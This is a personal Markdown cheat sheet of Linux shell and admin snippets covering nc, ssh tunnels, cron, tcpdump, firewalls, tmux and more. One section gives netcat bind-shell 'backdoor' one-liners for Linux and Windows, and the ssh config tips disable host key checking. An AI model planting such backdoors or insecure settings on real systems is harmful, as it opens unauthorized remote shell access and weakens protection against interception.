## netstat without netstat
```
awk 'function hextodec(str,ret,n,i,k,c){
    ret = 0
    n = length(str)
    for (i = 1; i <= n; i++) {
        c = tolower(substr(str, i, 1))
        k = index("123456789abcdef", c)
        ret = ret * 16 + k
    }
    return ret
}
function getIP(str,ret){
    ret=hextodec(substr(str,index(str,":")-2,2)); 
    for (i=5; i>0; i-=2) {
        ret = ret"."hextodec(substr(str,i,2))
    }
    ret = ret":"hextodec(substr(str,index(str,":")+1,4))
    return ret
} 
NR > 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp 
```
From https://staaldraad.github.io/2017/12/20/netstat-without-netstat/ 

## nc command to forward traffic
```bash
nc -v -lk -p 8001 -c "nc 127.0.0.1 8000"
```
and then use publicIP:8001 to accees `127.0.0.1 8000`
https://unix.stackexchange.com/questions/10428/simple-way-to-create-a-tunnel-from-one-local-port-to-another

Another way is to use socks proxy in SSHD to forward all traffic

## nc command to create a backdoor
Linux
```
nc -lk -p 6996 -e /bin/bash
```
or  Win
```
nc -lk -p 6996 -e cmd
```

Test backdoor: 
```
echo "ls -al " | nc -v xxx.xxx.xx.xxx 6996 
```

## assert var not empty
```bash
# if var empty, then exit
assert_var_not_empty() {
  var=$1
  [ ! -z ${!var} ] || ( >&2 echo "$i var is empty!"; exit 1 )
}

clean_db() {
  host=$1
  port=$2
  assert_var_not_empty "host"
  assert_var_not_empty "port"
  # ... continue with more code
}
```

## convert a socket to local file and communicate with it
comes from: 
```bash
#!/usr/bin/env bash
#
# Very simple bash client to send metrics to a statsd server
# Example with gauge:  ./statsd-client.sh 'my_metric:100|g'
#
# Alexander Fortin <alexander.fortin@gmail.com>
#
host="${STATSD_HOST:-127.0.0.1}"
port="${STATSD_PORT:-8125}"

if [ $# -ne 1 ]
then
  echo "Syntax: $0 '<gauge_data_for_statsd>'"
  exit 1
fi

# Setup UDP socket with statsd server
exec 3<> /dev/udp/$host/$port

# Send data
printf "$1" >&3

# Close UDP socket
exec 3<&-
exec 3>&-
```

## Terminal weird characters? 
```bash
export LC_ALL=en_US.UTF-8  
export LANG=en_US.UTF-8
# and then hit a top command here and then Ctrl+C
```

## wait until event happen
This is an easy version

```
until ls -al|grep -m 1 "microservice" ; do sleep 1; done
```

Will wait until `microservice` occured.


## wait until event happen
```bash
# wait until event happen 
# args: 
#         1. timeout seconds
#         2. commands to verify condition meet, needs to quoted with "${COMMAND}"
# return: 0, normal, 
#         1, timeout
function wait_loop_until_event {
  cv="false"
  timeout="${1-10}"
  commands="${2-echo COMMAND}"
  elapsed=0
  ret=0
  while true; do
    if [[ $elapsed -gt $timeout ]]; then
      ret=1
    fi
    eval "${commands}"
    if [[ "$?" == "0" ]]; then
      break
    else
      sleep 1
      elapsed=$((elapsed+1))
    fi
  done
  return ${ret}
}
```
Example to use: 
```bash
# in window 1
wait_loop_until_event 10 "ps -ef|grep WebLogic | grep -v grep"
# in window 2 ... start WebLogic server
```
## log with color
Ref: http://jafrog.com/2013/11/23/colors-in-terminal.html
```bash
function log()   { echo -e "$1"; }
#green
function info()  { log "\e[32;3m$1\e[0m"; }
#yellow
function warn()  { log "\e[33;3m$1\e[0m"; }
#red
function error() { log "\e[31;3m$1\e[0m"; }

```
## nc command to exeucte HTTP request to 
```bash
printf 'GET /images/json HTTP/1.0\r\n\r\n' | nc -U /var/run/docker.sock 
# or use echo, since echo already have a \r\n 
echo -e "GET /images/json HTTP/1.0\r\n" | nc -U /var/run/docker.sock
```
## Coredump Debug Python

1. `ulimit -c unlimited` to show coredump

2. Install Gdb and support by using `Install by using 
 - python 2
   ```bash
   $ yum install gdb && yum install python-debug && debuginfo-install python-debug-2.7.5-68.el7.x86_64
   ```
 - python 3.6
   Write files `/etc/yum.repos.d/epel.repo` and  `/etc/yum.repos.d/epel-debug.repo`: 
    ```bash
    [base-epel]
    name=EPEL
    baseurl=https://dl.fedoraproject.org/pub/epel/7Server/x86_64
    gpgcheck=0
    enabled=1
    ```
   and 

    ```bash
    [base-debuginfo-epel]
    name=EPEL-DebugInfo
    baseurl=https://dl.fedoraproject.org/pub/epel/7Server/x86_64/debug/
    gpgcheck=0
    enabled=1
    ```
    Then run next bash command: 
    ```bash
    $ yum install gdb && yum install python36-debug && debuginfo-install python36-debug-3.6.3-7.el7.x86_64
    ```
3. When excuting using `python-debug`, it will have `Segmentation fault (core dumped) `

4. Then debug using `gdb python-debug ./core.32275`, then type `where` or `bt` or other `gdb` command

5. Or attach into process using `gdb -p <pid>` 


## ntp/ntpdate

sync time: `ntpdate -u <server_name>`
for internet connected servers, just execute such command into crontab.
setting up non-internet connected `LAN` area ntp server:
1. install ntp daemon on one node and start the service there, say
2. adding next conf to `/etc/ntp.conf` into server section , of course, you also need to add `LAN restriction` section
   ```bash
   server 127.127.1.0
   fudge 127.127.1.0 stratum 8
   ```
3. start and enable `ntp` server on boot
4. execute `ntpdate -u <LAN_NTP_SERVER_NAME>` into crontab for other servers

## add options into script
```bash
function usage {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options are:"
    echo "  -d : Run with JDPA debugging enabled."
    echo "  -r : Just restart the existing running Tomcat. "
    echo "  -f : Run in foreground."
    echo "  -h : Print usage information."
}

DEBUG=0
FOREGROUND=0
RESTART=0
while getopts "dfhr" opt ; do
    case $opt in
        d) DEBUG=1 ;;
        f) FOREGROUND=1 ;;
        r) RESTART=1 ;;
        h) usage ; exit 0 ;;
        ?) usage ; exit 1 ;;
    esac
done
```
Use non-getopts to write optional args parsing, https://stackoverflow.com/a/14203146 

## mtr command
combing tracerout and ping command. 
Simple Usage: `mtr -r [destination host]`, but sometimes the `???` of the result doesn't always mean bad router, please refer:     
https://linode.com/docs/networking/diagnostics/diagnosing-network-issues-with-mtr/

## reserved space for root user in Linux
```bash
tune2fs -m 5 /dev/sda 
```

## use dumpe2fs to check ext4 Journal size
http://blog.dailystuff.nl/2012/07/getting-ext34-journal-size/
```bash
LANG=C dumpe2fs /dev/vda1  |grep ^Journal
```

## trap signal to do cleaning tasks before script exit
better to use child process handling... this also works in Jenkins shell...
```bash
#!/bin/bash

_term() { 
  echo "Caught SIGTERM signal!" 
  kill -TERM "$child" 2>/dev/null
}

trap _term SIGTERM SIGINT SIGKILL SIGHUP

echo "Doing some initial work...";

(
while true; do 
  echo "doing some work..."
  sleep 1
done
)&

child=$! 
wait "$child"
```
https://unix.stackexchange.com/questions/146756/forward-sigterm-to-child-in-bash
https://www.ibm.com/developerworks/aix/library/au-usingtraps/ 


## Python with Bash Mutual Operations
- Call Python in Bash, the core iea here is we `pass parameters via os.environ`. 
```bash
read -r -d '' PERSONS_JSON <<-EOF
{
    "morgan": {
        "name": "morganwu",
        "firstname": "Morgan",
        "lastname": "Wu"
    },
    "jack": {
        "name": "jackjiang",
        "firstname": "Jack",
        "lastname": "Jiang"
    },
}
EOF
export PERSONS_JSON
function extract_keys {
  python - <<"EOF"
import os,json
j=json.loads(os.environ['PERSONS_JSON'])
print(','.join(j.keys()))
EOF
}
```
- Call Bash in Python, the core idea is to use `subprocess.Popen([CMD_STR],stdout=subprocess.PIPE, shell=True)`
```python
sp = subprocess.Popen([executable, arg1, arg2], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
out, err = sp.communicate()
if out:
    print "standard output of subprocess:"
    print out
if err:
    print "standard error of subprocess:"
    print err
print "returncode of subprocess:"
print sp.returncode
```
1. json string extraction inside the bash
Python 2: 
```bash
export PYTHONIOENCODING=utf8
curl -s 'https://api.github.com/users/lambda' | \
    python -c "import sys, json; print json.load(sys.stdin)['name']"
```
Python 3: 
```bash
curl -s 'https://api.github.com/users/lambda' | \
    python3 -c "import sys, json; print(json.load(sys.stdin)['name'])"
```

2. operate json from CLI in an easy way
```bash
[09:30 PM morganwu@morgan-yinnut ~]$ curl -s https://api.github.com/users/xue777hua | python -c 'import sys, json; print json.load(sys.stdin)["avatar_url"]'
https://avatars.githubusercontent.com/u/3008959?v=3
```
3. Read file into lines and doing string operations
```bash
export FILE="time.207.237.67.29.log"
python -c "import os; [print(x.rstrip('\n')[:-7]) for x in open(os.environ['FILE'])]"
# OR using `print(*list,sep='\n')` to print
python3 -c "import os; print(*[x.rstrip('\n')[:-7] for x in open(os.environ['FILE'])],sep='\n')"
```

4. Cat files in python script
```python
    import subprocess
    subprocess.Popen(
        "cd %s; file=%s.yml;  "
        "echo "" > $file; "
        "for i in `ls completion-mt*`; "
        "  do cat $i >> $file;"
        "  echo '---'>> $file;"
        "done" % (
            DST_DIR,
            os.environ['COMPLETION_MULTITENANT_APP_NAME']
        ),
        stdout=subprocess.PIPE, shell=True)
```
5. resolve json data and do complex operation in heredoc python scripts
```bash
function check_docker_is_up {
  export NODES_TXT="./nodes.txt"
  python - <<EOF
#!/usr/bin/python
# -*- coding: utf-8 -*-
import json,os
print(os.environ['NODES_TXT'])
with open(os.environ['NODES_TXT']) as json_data:
  n = json.load(json_data) # NOTE: for string load, using json.loads(), not json.load()
  if n['nodes'][0].docker_status == "UP" and n['nodes'][0].status == "CONNECTED":
    print("true")
  else:
    print("false")
EOF
}
```

## capture the time output
```bash
[12:13 AM morganwu@morgan-yinnut ~]$ { time sleep 1 ; } 2> time.txt
[12:13 AM morganwu@morgan-yinnut ~]$ cat time.txt 

real	0m1.010s
user	0m0.001s
sys	0m0.002s

```

## use `ps` to sort by mem
sort by `MEM` from largest to small, and print only 1st 10 items.
```
ps aux --sort=-%mem | awk 'NR<=10{print $0}'
```

## use `ps` to see the threads inside some process

`-L: show thread`

```bash
[m92wu@ecelinux3 ~]$ ps -efL | grep out
m92wu     6684  6482  6684  0    3 15:38 pts/2    00:00:00 ./a.out 1 1
m92wu     6684  6482  6685  0    3 15:38 pts/2    00:00:00 ./a.out 1 1
m92wu     6684  6482  6686  0    3 15:38 pts/2    00:00:00 ./a.out 1 1
m92wu     6734  6691  6734  0    1 15:38 pts/3    00:00:00 grep --color=auto out
```

## IFS using \n
```bash
IFS=$'\n'; for i in `head -n 10 slow.log `;do echo $i ;done;
```
## if conditions 
[what should be put in the if [] ](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_07_01.html)

## bash calculator for floating point
```bash
[11:04 PM morganwu@morgan-yinnut producer]$ printf "%.6f\n" `bc -l <<< '100/3'` 
33.333333
[11:04 PM morganwu@morgan-yinnut producer]$ a=`bc -l <<< '100/3'`
[11:04 PM morganwu@morgan-yinnut producer]$ echo $a
33.33333333333333333333

```

## use alias for sudo
set alias sudo='sudo ' to use alias in your sudo command
```
[root@centos7-node-226 ~]# echo "alias sudo='sudo ' " >> ~/.bashrc 
[root@centos7-node-226 ~]# cat .bashrc |grep sudo
alias sudo='sudo ' 
```

## sudoers file good explanation 
https://www.digitalocean.com/community/tutorials/how-to-edit-the-sudoers-file-on-ubuntu-and-centos

## use alias for ssh session command
let alias to be expanded
```
[root@centos7-node-226 ~]# echo "shopt -s expand_aliases" >> ~/.bashrc 
```

## HEX DEC Conversion
```
$ printf %d 0xac
172
$ printf %x 172
ac
```
## debug selinux rule 
```bash
$ grep 1415714880.156:29 /var/log/audit/audit.log | audit2why
type=AVC msg=audit(1415714880.156:29): avc:  denied  { name_connect } for  pid=1349 \
  comm="nginx" dest=8080 scontext=unconfined_u:system_r:httpd_t:s0 \
  tcontext=system_u:object_r:http_cache_port_t:s0 tclass=tcp_socket

        Was caused by:
        One of the following booleans was set incorrectly.
        Description:
        Allow httpd to act as a relay

        Allow access by executing:
        # setsebool -P httpd_can_network_relay 1
        Description:
        Allow HTTPD scripts and modules to connect to the network using TCP.

        Allow access by executing:
        # setsebool -P httpd_can_network_connect 1
```
## ssh withouth host confirmation
```bash
scp -o "StrictHostKeyChecking no"
```
## ssh default config
1. without host key checking 
2. keep alive set
```bash
$ cat ~/.ssh/config
Host *
    ServerAliveInterval 240
    StrictHostKeyChecking no
    UserKnownHostsFile=/dev/null
```

## network debug
* `ss -a`
* `netstat -nalp`
* `lsof -P -i:22`
* `nmap -sV xxx.xxx.xxx.xxx -p3333-3333`: connect to `xxx.xxx.xxx.xxx` on port of `3333`

## date command
GMT+0 format
```bash 
[01:58 PM morganwu@morgan-yinnut local]$ date
Sat Dec  5 13:58:52 CST 2015
[01:58 PM morganwu@morgan-yinnut local]$ date -u +%FT%H:%M:%SZ 
2015-12-05T05:58:53Z
```

delta date, days ago, week ago: 
```bash
[01:58 PM morganwu@morgan-yinnut ~]$ date +%Y-%m-%d
2018-03-26
[01:58 PM morganwu@morgan-yinnut ~]$ date -d "1 day ago" +%Y-%m-%d
2018-03-25
[01:58 PM morganwu@morgan-yinnut ~]$ date -d "1 week ago" +%Y-%m-%d
2018-03-19
```

## zip && unzip
```bash
## view files in zip
$ unzip -l file.zip
## zip all files under a directory
$ zip -r file.zip file_dir
```
## query list of rpm package 
list installed/uninstalled rpm content( or to know what will be influenced after installation or uninstallation)
```bash
# for uninstalled rpm ( there should be a package.rpm file in the current directory)
[root@kube0 ~]$ rpm -qlp package.rpm
# for installed rpm (eg. get the name from `rpm -qa|grep ${name}` )
[root@kube0 ~]$ rpm -ql package  
```
## get gateway IP from bash
```bash
[07:34 PM morganwu@morgan-yinnut start-point]$ curl ifconfig.me
45.62.218.226
```

## socks5 proxy 
curl: 
```bash
$ curl --socks5 127.0.0.1:9050
```

git: 
```bash
$ git config --global https.proxy 'socks5://127.0.0.1:1080'
$ git config --global http.proxy 'socks5://127.0.0.1:1080'
```
## parallel + rsync
Next command will open `cpucores` parallel processes to do rsync job
```
ls -1 /var/log/mysql | parallel rsync -avz /var/log/mysql/{} /mnt/volume_sfo2_mysql_log/mysql_log
```
or we can use `parallel -j30` to overrite the parallism which by default is cpu cores.

## rsync files, include, exclude, hidden files
```bash
rsync --progress -avz --delete --recursive --exclude-from=.exclude . -e 'ssh -p REMOTE_PORT' root@xxx.xxx.xxx.xxx:~
```
We sync all files from current directory to remote machine directory by using ssh protocol with a `REMOTE_PORT` specific port, `.exclude` content is listed as below:  leading + means include, leading - means exclude 
```txt
+ ./*
- .idea/
- .git/
- target/
- input/
- input/in1
- input/in2
- input/in2/in3
- logs/
```

## crontab examples 
Overall Rule: 
```bash
# Minute   Hour   Day of Month       Month          Day of Week        Command    
# (0-59)  (0-23)     (1-31)    (1-12 or Jan-Dec)  (0-6 or Sun-Sat)                
    0        2          12             *                *            /usr/bin/find
```
This line executes the `ping` command **every minute of every hour of every day of every month**. The standard output is redirected to dev null so we will get no e-mail but will allow the standard error to be sent as a e-mail. 
```bash
*       *       *       *       *       /sbin/ping -c 1 192.168.0.1 > /dev/null
```
This line executes the `ping` and the `ls` command **every 12am and 12pm on the 1st day of every 2 month intervaly**. 
```bash
0 0,12 1 */2 * /sbin/ping -c 192.168.0.1; ls -la >>/var/log/cronrun
```
This line executes the disk usage command to get the directory sizes **every 2am on the 1st through the 10th of each month**. E-mail is sent to the email addresses specified with the MAILTO line. The PATH is also set to something different.
```bash
PATH=/usr/local/sbin:/usr/local/bin:/home/user1/bin
MAILTO=user1@nowhere.org,user2@somewhere.org
0 2 1-10 * * du -h --max-depth=1 /
```
This line is and example of running a cron job **every month at 4am on Mondays, and on the days between 15-21**. This is because using the day of month and day of week fields with restrictions (no *) makes this an "or" condition not an "and" condition. Both will be executed.
```bash
0 4 15-21 * 1 /command
```
Run on **every second Sunday of every month**. The test has to be run first because of the issue mentioned in the example above.
```bash
0 4 8-14 * *  test $(date +\%u) -eq 7 && echo "2nd Sunday"
```
## search PDF via `pdfgrep`
could be installed by `brew install pdfgrep` under OSX
```bash
$ find /path -iname '*.pdf' -exec pdfgrep pattern {} +
```

## find files more than 100MB
```bash
$ find . -type f -size +1000000k 
```
## find & grep combination
Delete all files whose name include `bluestack` but path name exclude `Desktop` characters。
```bash
$ sudo find . -iname "*bluestack*" ! -path "*Desktop*" -exec rm -rf {} \;
```
## find the files changed 30 dasy ago
```bash
find . -type f -mtime +30 -exec ls -hl {} \;
```

## forward local port 3307 to remote 3306
```bash
$ ssh -p 16688 -L 3307:me-db-1:3306 root@159.203.44.228
```
If we connect to 127.0.0.1:3307 locally, it's like we're connecting me-db-1:3306 by loggin into root@m159.203.44.228 server.
```bash
ssh -p 575 -L 9000:127.0.0.1:20001 xxxx@159.203.238.66
```
This will forward local 9000 port to remote machine 159.203.238.66's 20001 port and 20001 port is listening on 127.0.0.1. 


## ssh by using local port as SOCKS5 proxy
```bash
$ ssh -NT -D 0.0.0.0:9999 -C user@host
```
-NT: keep alive    
-D: Dynamic forwarding    
-C: Compress communication    
http://www.howtogeek.com/114812/5-cool-things-you-can-do-with-an-ssh-server/     


## github ssh protocol, using SOCKS5 proxy
1. create ssh tunnel 
`ssh -f -N -D 1080 user@host`
2. in `~/.ssh/config` file add next section
```bash
Host github.com # here you may want to use your own git repo host
    User                    git
    ProxyCommand            nc -x localhost:1080 %h %p
```
    1. if we want to connet via http protocol
```bash
git config http.proxy socks5://localhost:1080
```

## ssh generate pub key from existing private key
```bash
$ ssh-keygen -f private_key -y
```
## ssh hostbased authentication
Write next config for `srv1` server with username/hostname/port/Identity, and even doesn't check the hostname matching.
```bash
Host srv1
    User vagrant
    Port 2222
    Hostname 127.0.0.1
    IdentityFile /Users/morganwu/Developer/workspace/ssh_port_forward/server1/.vagrant/machines/default/virtualbox/private_key
    StrictHostKeyChecking no

```

## SSH FORWARD X11 in MacOS
For X11 forward in Win: http://www.pandan.xyz/2017/02/18/%E4%BD%BF%E7%94%A8SSH%E7%9A%84X11%20Forwarding%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8CGUI%E7%A8%8B%E5%BA%8F/ 

Normally we would like to open X11 Applications from MacOSX. It needs these steps:
1. install XQuartZ from https://www.xquartz.org/ needs restart macOS to enalbe 
2. in Linux, make sure `X11Forwarding yes` and `X11UseLocalhost no` are enabled in `/etc/ssh/sshd_config`
3. (`xorg-xauth and xorg-xhost` matters) also needs to setup XWindow in Linux, here is an example in CentOS/Linux https://codingbee.net/tutorials/vagrant/vagrant-enabling-a-centos-vms-gui-mode 
```bash
yum groupinstall -y 'gnome desktop' # CentOS
yum groupinstall "Server with GUI" # RHEL Server
yum install -y 'xorg*'
yum remove -y initial-setup initial-setup-gui # remove EULA agreements, we don't want user interaction which will prevent automated startups via vagrant
systemctl isolate graphical.target && systemctl set-default graphical.target # make gui target as default target
vagrant reload
```
4. open XQuartZ from MacOS, or type `ssh -X` into Linux box, and execute the `xclock` from there. 

##  heredoc 
- Write to file
```bash
# can't use variable here
sudo tee /etc/yum.repos.d/docker.repo <<-'EOF'
[dockerrepo]
name=Docker Repository
baseurl=https://yum.dockerproject.org/repo/main/centos/7/
enabled=1
gpgcheck=1
gpgkey=https://yum.dockerproject.org/gpg
EOF
```
```bash
# we can use variable here
cat << EOF > /etc/yum.repos.d/docker.repo
[dockerrepo]
name=Docker Repository
baseurl=https://yum.dockerproject.org/repo/main/centos/7/
enabled=1
gpgcheck=1
gpgkey=https://yum.dockerproject.org/gpg
EOF
```
```bash
# using sed before writting to file
cat <<'EOF' |  sed 's/a/b/' | sudo tee /etc/config_file.conf
foo
bar
baz
EOF
```
- Write to variable
```bash
read -r -d '' VAR <<-'EOF'
    abc'asdf"
    $(dont-execute-this)
    foo"bar"''
EOF
```

## CPU benchmark
```bash
time echo "scale=5000; 4*a(1)" | bc -l -q
```
### using this will keep creating yes until stopped
```bash
yes > /dev/null
```

## disk io benchmark
```bash
fio --randrepeat=1 --ioengine=libaio --direct=1 --gtod_reduce=1 --name=test --filename=test --bs=4k --iodepth=64 --size=4G --readwrite=randrw --rwmixread=75
```

## vim batch insert `space` / `#` / `//` 
1. must use vim, not vi
2. key sequences: 1) ctrl + v 2) select all lines 3) shift + insert 4) type what you want 5) Esc

## Vimrc configuration
https://github.com/amix/vimrc

## zsh configuration
https://ohmyz.sh/ 

disable git info from the prompt `git config --add oh-my-zsh.hide-status 1` if you have a large repo, or it will be very slow...

## cygwin basic packages
```
setup-x86_64.exe --quiet-mode --no-shortcuts --upgrade-also --packages autoconf,autogen,automake,cygwin-devel,git,gcc-core,gcc-g++,libncurses-devel,libprotobuf-devel,make,openssh,openssl-devel,perl,perl_pods,pkg-config,tmux,zlib-devel
cygcheck -dc cygwin
```
From : https://github.com/mobile-shell/mosh/blob/master/appveyor.yml#L33 
1. app `curl` `wget` `ssh` `tree` `rsync` `nc`(a simple but powerful tool) `zip` `unzip`(Info-Zip Compression Utilities)
2. build 
    1. General build environment tools
    - autoconf
    - autoconf2.5
    - autogen
    - automake
    - automake1.15
    - libtool
    - make
    2. Compilers
    - gcc-g++
    - mingw64-x86_64-gcc-core
    - mingw64-x86_64-gcc-g++
    3. Python
    - python37
    - python37-devel
    - python3-configobj
    4. OpenMPI
    - libopenmpi-devel
    - openmpi
    5. Miscellaneous
    - vim (or any other editor in order to be able to edit files)
    - rsh
    - wget (to be able to download from the command line)
    - zlib-devel

### cygwin terminal color
``` bash 
$ cat ~/.minttyrc
BackgroundColour=13,25,38
ForegroundColour=217,230,242
CursorColour=217,230,242
Black=0,0,0
BoldBlack=38,38,38
Red=184,122,122
BoldRed=219,189,189
Green=122,184,122
BoldGreen=189,219,189
Yellow=184,184,122
BoldYellow=219,219,189
Blue=122,122,184
BoldBlue=189,189,219
Magenta=184,122,184
BoldMagenta=219,189,219
Cyan=122,184,184
BoldCyan=189,219,219
White=217,217,217
BoldWhite=255,255,255
BoldAsFont=-1
FontHeight=9
```

## bash script current working directory
change current working dir to script directory.
```bash
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
```

## add swap space to Linux (VM) 
```bash
dd if=/dev/zero of=/swapfile count=1024 bs=1MiB
chmod 600 /swapfile
mkswap /swapfile
swapon /swapfile
swapon --show
echo '/swapfile swap swap sw 0 0' | sudo tee -a /etc/fstab
/swapfile swap swap sw 0 0
sysctl vm.swappiness=10
sysctl vm.vfs_cache_pressure=50
vi /etc/sysctl.conf 
 vm.vfs_cache_pressure = 50
 vm.swappiness = 10
```
Ref: https://www.digitalocean.com/community/tutorials/how-to-add-swap-space-on-ubuntu-16-04 

## Crontab check a process and retart if dead
```bash
ps -ef | grep jenkins | grep -v grep | grep -v 'su jenkins' || /usr/sbin/service jenkins restart >/tmp/startjenkins.log 2>&1
```
## tcpdump commands
monitor the network flow of 30006 port. 
```bash
[root@node-3-slave-codential wktang]# tcpdump -n -i eth0 tcp port 30006 
# -n: don't convert IP address, i.e, show ip addr instead of hostname
# -i: filter the interface
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 
```
for more, please review [tcpdump](https://tldr.ostera.io/tcpdump) and [tcpdump chinese blog](http://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html)

**TCPDUMP file to Wireshark**

 - This records all traffic from/to 153.71.28.115 and save it to SuccessC2Server.pcap.    
 - The most import is to keep `-s` option.
```bash
tcpdump -i eth0 -s 0 -w SuccessC2Server.pcap host 153.71.28.115
```

### tcpdump for ASCII or text format
```bash
tcpdump -A -s 10240 'udp port 9125' # monitoring all 9125 port traffic in text format
```

## firewall-cmd/ufw uses/iptables uses
- firewall-cmd:
```bash
firewall-cmd --zone=public --add-port=5060-5061/udp --permanent
firewall-cmd --zone=public --add-rich-rule 'rule family="ipv4" source address="192.168.1.10" port port=22 protocol=tcp accept'
```
add `5060-5061/udp` to white list of `public` zone and make `--permanent`, you need restart firewalld service. 

- ufw:
```bash
ufw allow proto tcp from 74.207.245.148 to any port 6379
```
This allows tcp from `74.207.245.148` to access this machine `6379` port of any net interface card. 

```bash
root@discuss:~# ufw status |grep '/' | nl
...
     8	8649/udp                   ALLOW       Anywhere
     9	8649/tcp                   ALLOW       Anywhere
    10	80/tcp (v6)                ALLOW       Anywhere (v6)
    11	4567/tcp (v6)              ALLOW       Anywhere (v6)
...
```
use `nl` to calculate the line number of output, this makes `ufw delete [LINE_NUM]` easier


- iptables: 
```bash
# using -A / -I to append/insert
iptables -A INPUT -s 1.2.3.4 -p tcp --dport 21 -j ACCEPT
```

## `xargs` and apply command to each line
```bash
[root@RHEL7264Bit-7 temp]# find .|grep layer |xargs ls -ltrah
-rw-r--r-- 1 root root  49M Aug 25 12:49 ./e396e1feba70f9da0f880c2fb7719d5e749bf8cfbb6fed02921ed2b78a282c77/layer.tar
-rw-r--r-- 1 root root  53M Aug 25 12:49 ./d642a9532ee6b2288746712db1262d4c5a7ec1bead9d017be9af5efb222896f0/layer.tar
-rw-r--r-- 1 root root 7.5K Aug 25 12:49 ./c6c9f58a01422d043ac79433669d75ac919a11fe118f8d800757614b648e3bdb/layer.tar
-rw-r--r-- 1 root root  16K Aug 25 12:49 ./bd5b778776e7b7078ae7d092d2d4ab7f595c1bdc54039382b56760b1b7db8985/layer.tar
-rw-r--r-- 1 root root 5.5K Aug 25 12:49 ./b55669c9130d2b008064030fbec347810c89ed3c49db993e2890be160c1cf39d/layer.tar
-rw-r--r-- 1 root root  93M Aug 25 12:49 ./a38b6a23ef9916bac242e117d93b671d057053769fc6af0e670fc80e20cb8596/layer.tar
-rw-r--r-- 1 root root 2.5K Aug 25 12:49 ./9e395f45ba84e52f725ce374e64dd7167b4a2d5db0c3a965013c545a3c16ebe9/layer.tar
-rw-r--r-- 1 root root 3.0K Aug 25 12:49 ./693e42990d01db119b677337f7d47388d20692db0b07a0ab8ed05ab62913ecc2/layer.tar
-rw-r--r-- 1 root root 368M Aug 25 12:49 ./5ad685d5a369a7263e35d38eefc68ec60dd723ad8fd3afb1239ade6653631169/layer.tar
-rw-r--r-- 1 root root  27K Aug 25 12:49 ./5481d59c50807917e95aa6e96656405f46db02096b41220d47401033e90d122d/layer.tar
-rw-r--r-- 1 root root  16K Aug 25 12:49 ./4cdeb608206b07a92bdeb3beef88ddbd84ff922cee342bea413be28734ad92fe/layer.tar
-rw-r--r-- 1 root root 3.0K Aug 25 12:49 ./29d31c8f4e579e888d32bfe445b487dcbc72e9416de138718d615f0d4c3663c7/layer.tar
-rw-r--r-- 1 root root 192M Aug 25 12:49 ./1f848715be222b4f94304d00bc5b265a03c1c1253c9e4a980387fa636cd0d76f/layer.tar
-rw-r--r-- 1 root root  16M Aug 25 12:49 ./0b0141ebf39d736914c6858ddc84f6ee3d46371e077ed9ecee2e1e7b2d726e37/layer.tar
```

## output string to stderr
```bash
(>&2 echo "Certificate tls.crt does not exist! Please put it there or generate one!" )
```
## init.d script example
Using this as an template: 
```bash
#! /bin/sh
### BEGIN INIT INFO
# Provides: statsd
# Required-Start: $remote_fs $syslog    
# Required-Stop: $remote_fs $syslog    
# Default-Start: 2 3 4 5    
# Default-Stop: 0 1 6    
# Short-Description: statsd
# Description: This file starts and stops statsd server    
# 
### END INIT INFO    
case "$1" in
    start)
        cd /opt/statsd && nohup /usr/bin/node ./stats.js ./myConfig.js > run.log 2>&1 & 
    ;;
    stop)
        pkill statsd
    ;;
    restart)
        pkill statsd
        cd /opt/statsd && nohup /usr/bin/node ./stats.js ./myConfig.js > run.log 2>&1 &
    ;;
    status)
        ps -ef | grep "statsd" | grep -v grep && exit 0 || exit $?
    ;;
    *)
        echo "Usage: $0 {start|stop|restart}" >&2
        exit 3
    ;;
esac
```
After this, use `systemctl enable statsd` to added it to default level startup, so that it could be controlled by `systemctl`. 
```bash
root@leetcode:/opt/statsd# systemctl enable statsd
statsd.service is not a native service, redirecting to systemd-sysv-install
Executing /lib/systemd/systemd-sysv-install enable statsd
root@leetcode:/opt/statsd# systemctl status statsd
● statsd.service - LSB: statsd
   Loaded: loaded (/etc/init.d/statsd; bad; vendor preset: enabled)
   Active: active (running) since Mon 2017-11-06 22:00:22 PST; 3min 58s ago
     Docs: man:systemd-sysv-generator(8)
   CGroup: /system.slice/statsd.service
           └─13194 statsd ./myConfig.js                  

Nov 06 22:00:22 leetcode.com systemd[1]: Starting LSB: statsd...
Nov 06 22:00:22 leetcode.com systemd[1]: Started LSB: statsd.
```

### create a new disk partition and format the new disk partition
Here is an example of the newly added disk `/dev/sdb`
```bash
# do not change space or newline of this echo 
echo "n \
p




w
q" | fdisk /dev/sdb
mkfs.xfs /dev/sdb1
mkdir -p /mnt/largedisk
mount /dev/sdb1 /mnt/largedisk
echo 'mount /dev/sdb1 /mnt/largedisk' >> /etc/rc.local
chmod +x /etc/rc.d/rc.local
```

## Apache HTTPD Basic Auth 
https://wiki.apache.org/httpd/PasswordBasicAuth

## Screen Management
```bash
# open a lc named screen and start with bash terminal
screen -dmS lc bash
# sleep 1 second 
sleep 1
# in the lc, make the screen filled with tail command output
screen -XS lc screen tail -f /var/log/nginx/access.log
```
- use `screen -ls` to review 
- use `screen -r id` to attach
- use `Ctrl+ad` to detach

## Tmux Screen Management
**BY DEFAULT**, no other tmux conf, tmux commands:
### session management
 - `tmux new -s <session_name>`: create a new session
 - `tmux ls`: list sessoins
 - `tmux a -t <session_id>`: attach into session
 - `ctrl+b+d`: detach from session
### cut screen, pane management
 - `ctrl+b+"`: vertical cut
 - `ctrl+b+%`: horizontal cut
 - `ctrl+b+x`: kill current pane
### copy mode
 - `ctrl+b+[ / q`: enter / exit copy mode
 - `ctrl+S`: search inside the copy mode
### set the title of pane
```bash
printf '\033]2;%s\033\\' '<this_is_my_title>'
```
for more: https://gist.github.com/morganwu277/3d101d2a9e0b4799b9cb6c68cc2fdd19


##### My `~/.tmux.conf` content
```bash
set -g history-limit 50000
set -g mouse on
set-window-option -g mode-keys vi
setw -g mode-keys vi
bind-key -T copy-mode-vi y send-keys -X copy-pipe-and-cancel "reattach-to-user-namespace pbcopy" \; display-message "copied to system clipboard"
